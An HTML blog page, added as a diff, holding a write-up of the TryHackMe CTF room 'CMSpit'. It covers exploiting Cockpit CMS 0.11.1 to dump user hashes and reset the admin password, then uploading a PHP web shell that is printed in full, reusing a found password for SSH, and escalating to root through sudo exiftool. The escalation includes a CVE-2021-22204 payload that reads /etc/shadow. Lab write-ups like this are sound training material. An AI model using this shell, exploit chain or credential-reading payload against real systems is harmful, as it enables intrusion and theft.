@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+    <link rel="manifest" href="/images/site.webmanifest">
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="My write-up for CMSpit, a TryHackMe machine created by stuxnet.">
+    <title>TryHackMe: CMSpit | ben-dale.co.uk</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    <link rel="stylesheet" href="/css/theme-override.css">
+    <header>
+
+  <nav>
+    <ul>
+      
+      
+      <li class="pull-left ">
+        <a href="/">~/ben-dale.co.uk</a>
+      </li>
+      
+      
+      <li class="pull-left ">
+        <a href="/tags/">~/tags</a>
+      </li>
+      
+
+      
+      
+      <li class="pull-right">
+        <a href="/index.xml">~/rss</a>
+      </li>
+      
+
+    </ul>
+  </nav>
+</header>
+
+  </head>
+
+  <body>
+    <br/>
+
+<div class="article-meta">
+<h1><span class="title">TryHackMe: CMSpit</span></h1>
+
+<h2 class="date">2022/05/28</h2>
+<p class="terms">
+  
+  
+  
+  
+  Tags: <a href="/tags/php">php</a> <a href="/tags/cve">cve</a> <a href="/tags/ssh">ssh</a> <a href="/tags/exiftool">exiftool</a> 
+  
+  
+</p>
+</div>
+
+
+<div class="content-wrapper">
+  <main>
+    <p>Here&rsquo;s my write-up for <a href="https://tryhackme.com/room/cmspit">CMSpit</a>, a CTF challenge created by <a href="https://tryhackme.com/p/stuxnet">stuxnet</a>.</p>
+<h3 id="write-up">Write-up</h3>
+<p>I deployed the machine using TryHackMe&rsquo;s interface and scanned the host using <code>nmap</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">└──╼ $nmap -sV sC 10.10.77.222
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-28 10:48 CEST
+Failed to resolve &#34;sC&#34;.
+Nmap scan report for 10.10.77.222
+Host is up (0.056s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><p>This machine had the following ports exposed:</p>
+<ul>
+<li>Port 22: OpenSSH 7.2p2</li>
+<li>Ports 80: Apache httpd 2.4.18</li>
+</ul>
+<p>I took a look at what was running on port 80 and was presented with a login form.</p>
+<p><img src="/static/cmspit/1.png" alt=""></p>
+<p>A quick review of the page source showed that this was a CMS named Cockpit, and the version running was 0.11.1</p>
+<p>Several CVEs exist for Cockpit 0.11.1 which, when exploited, allow a malicious user to enumerate users, retrieve the hashes of user passwords, and reset user passwords.</p>
+<p>I used <a href="https://www.exploit-db.com/exploits/50185">this exploit</a> to enumerate users and collect password hashes for each user.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">└──╼ $python 50185.py -u http://10.10.77.222
+[+] http://10.10.77.222: is reachable
+[-] Attempting Username Enumeration (CVE-2020-35846) : 
+
+[+] Users Found : [&#39;admin&#39;, &#39;darkStar7471&#39;, &#39;skidy&#39;, &#39;ekoparty&#39;]
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">-----------------Details--------------------
+     [*] user : admin
+     [*] name : Admin
+     [*] email : admin@yourdomain.de
+     [*] active : True
+     [*] group : admin
+     [*] password : $2y$10$dChrF2KNbWuib/5lW1ePiegKYSxHeqWwrVC.FN5kyqhIsIdbtnOjq
+     [*] i18n : en
+     [*] _created : 1621655201
+     [*] _modified : 1621655201
+     [*] _id : 60a87ea165343539ee000300
+     [*] _reset_token : rp-1de3f13392358f17cbc4eb781ebcf4fe6291e2e291041
+     [*] md5email : a11eea8bf873a483db461bb169beccec
+--------------------------------------------
+-----------------Details--------------------
+     [*] user : darkStar7471
+     [*] email : darkstar7471@tryhackme.fakemail
+     [*] active : True
+     [*] group : admin
+     [*] i18n : en
+     [*] api_key : account-3bdaf7b838bd37df042918c00fb528
+     [*] name : darkStar7471
+     [*] password : $2y$10$uAm8IylkDFQviO/CbzP4duOqKCFCFZTiv2x7JSdm2UWyr9TJUX86e
+     [*] _modified : 1621657994
+     [*] _created : 1621657994
+     [*] _id : 60a8898b6565354b19000323
+     [*] _reset_token : rp-1ec925f72f14a77bb8ebfb935c7834226291e52a9e735
+     [*] md5email : 57e606455d7cecb913cc5316d6947359
+--------------------------------------------
+-----------------Details--------------------
+     [*] user : skidy
+     [*] email : skidy@tryhackme.fakemail
+     [*] active : True
+     [*] group : admin
+     [*] i18n : en
+     [*] api_key : account-21ca3cfc400e3e565cfcb0e3f6b96d
+     [*] password : $2y$10$uiZPeUQNErlnYxbI5PsnLurWgvhOCW2LbPovpL05XTWY.jCUave6S
+     [*] name : Skidy
+     [*] _modified : 1621719311
+     [*] _created : 1621719311
+     [*] _id : 60a9790f393037a2e400006a
+     [*] _reset_token : rp-1e1cf190ee45f82d60c7ea1fc69962236291e535f1bd2
+     [*] md5email : 5dfac21f8549f298b8ee60e4b90c0e66
+--------------------------------------------
+-----------------Details--------------------
+     [*] user : ekoparty
+     [*] email : ekoparty@tryhackme.fakemail
+     [*] active : True
+     [*] group : admin
+     [*] i18n : en
+     [*] api_key : account-c06006d6bf8227d107a500ee1625e3
+     [*] password : $2y$10$Cz5whXg.dzlI4t8upxw9GulhqVbt0hNVE8trz5aB2pReye5/qW8BW
+     [*] name : Ekoparty
+     [*] _modified : 1621719688
+     [*] _created : 1621719688
+     [*] _id : 60a97a883163330a2200023e
+     [*] _reset_token : rp-1c4858421435abb88ec851a3b6032d926291e53dd38e0
+     [*] md5email : 199e50817a7b057867d9ce0261891304
+--------------------------------------------
+</code></pre></div><p>I set up <code>hashcat</code> to try and crack the passwords in the background.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">hashcat -m 3200 -a 0 hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
+</code></pre></div><p>I then reset the admin user&rsquo;s password using the exploit so that I could gain access.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">[+] Do you want to reset the passowrd for admin? (Y/n): y
+[-] Attempting to reset admin&#39;s password:
+[+] Password Updated Succesfully!
+[+] The New credentials for admin is: 
+     Username : admin 
+     Password : r+C*jc6MTX
+</code></pre></div><p>Cockpit has a pretty slick interface and comes with file management and code editing features, which allowed me to upload a custom php file that would execute shell commands.</p>
+<p><img src="/static/cmspit/3.png" alt=""></p>
+<p>I uploaded the following snippet to a shell.php file and navigated to /shell.php in my browser.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">&lt;html&gt;
+&lt;body&gt;
+&lt;form method=&#34;GET&#34; name=&#34;&lt;?php echo basename($_SERVER[&#39;PHP_SELF&#39;]); ?&gt;&#34;&gt;
+&lt;input type=&#34;TEXT&#34; name=&#34;cmd&#34; id=&#34;cmd&#34; size=&#34;80&#34;&gt;
+&lt;input type=&#34;SUBMIT&#34; value=&#34;Execute&#34;&gt;
+&lt;/form&gt;
+&lt;pre&gt;
+&lt;?php
+    if(isset($_GET[&#39;cmd&#39;]))
+    {
+        system($_GET[&#39;cmd&#39;]);
+    }
+?&gt;
+&lt;/pre&gt;
+&lt;/body&gt;
+&lt;script&gt;document.getElementById(&#34;cmd&#34;).focus();&lt;/script&gt;
+&lt;/html&gt;
+</code></pre></div><p><img src="/static/cmspit/5.png" alt=""></p>
+<p>After a little enumeration, I came across a &ldquo;stux&rdquo; user.</p>
+<p><img src="/static/cmspit/7.png" alt=""></p>
+<p>Inside stux&rsquo;s home directory was a file named &ldquo;.dbshell&rdquo; which contained a password.</p>
+<p><img src="/static/cmspit/8.png" alt=""></p>
+<p>The password found in &ldquo;.dbshell&rdquo; was the same password used to access stux&rsquo;s account via ssh.</p>
+<p><img src="/static/cmspit/10.png" alt=""></p>
+<p><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">Linpeas</a> reported that the stux user could run <code>exiftool</code> as root without a password.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">╔══════════╣ Checking &#39;sudo -l&#39;, /etc/sudoers, and /etc/sudoers.d
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+Matching Defaults entries for stux on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User stux may run the following commands on ubuntu:
+    (root) NOPASSWD: /usr/local/bin/exiftool
+</code></pre></div><p>I was able to get the root flag using a technique listed on <a href="https://gtfobins.github.io/gtfobins/exiftool/">GTFObins</a>:</p>
+<p><img src="/static/cmspit/11.png" alt=""></p>
+<p>Although reading files via <code>exiftool</code> allowed me to get the root flag, it was not the intended path for this CTF.</p>
+<p>The intended path is to exploit <a href="https://www.exploit-db.com/docs/49881">CVE-2021-22204</a>.</p>
+<p>I created a file named &ldquo;exploit&rdquo;, containing a command that should only be allowed to be executed by root.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">(metadata &#34;\c${system (&#39;cat /etc/shadow&#39;)};&#34;)
+</code></pre></div><p>As per the exploit instructions, I ran <code>djvumake</code> with the necessary arguments, and successfully executed a command as the root user.</p>
+<p><img src="/static/cmspit/12.png" alt=""></p>
+<h3 id="final-thoughts">Final thoughts</h3>
+<p>A fun challenge that required me to chain exploits for several CVEs to increase privilege. Thanks Stuxnet!</p>
+
+    <a href="/"> >> Home</a>
+  </main>
+</div>
+    <footer>
+      
+<script>
+(function() {
+  function center_el(tagName) {
+    var tags = document.getElementsByTagName(tagName), i, tag;
+    for (i = 0; i < tags.length; i++) {
+      tag = tags[i];
+      var parent = tag.parentElement;
+      
+      if (parent.childNodes.length === 1) {
+        
+        if (parent.nodeName === 'A') {
+          parent = parent.parentElement;
+          if (parent.childNodes.length != 1) continue;
+        }
+        if (parent.nodeName === 'P') parent.style.textAlign = 'center';
+      }
+    }
+  }
+  var tagNames = ['img', 'embed', 'object'];
+  for (var i = 0; i < tagNames.length; i++) {
+    center_el(tagNames[i]);
+  }
+})();
+</script>
+
+      
+      <hr/>
+      <a href="https://github.com/ben-dale">Github</a> | <a href="https://keybase.io/mrbenjamind">Keybase</a> | <a href="https://twitter.com/mrbenjamind">Twitter</a>
+      
+    </footer>
+    
+  </body>
+</html>
+
